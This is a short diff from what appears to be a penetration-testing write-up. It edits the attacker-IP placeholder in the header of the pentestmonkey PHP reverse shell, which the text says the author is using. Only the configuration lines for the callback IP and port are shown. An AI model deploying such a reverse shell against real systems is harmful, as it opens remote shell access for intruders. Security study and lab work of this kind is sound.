@@ -30,7 +30,7 @@ I'm going to use php code for reverse shell by "https://pentestmonkey.net/":
   // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
   set_time_limit (0);
   $VERSION = "1.0";
-  $ip = '[IP]';  // You have changed this
+  $ip = '[MY-IP]';  // change this
   $port = [PORT];  // And this
   $chunk_size = 1400;
   $write_a = null;
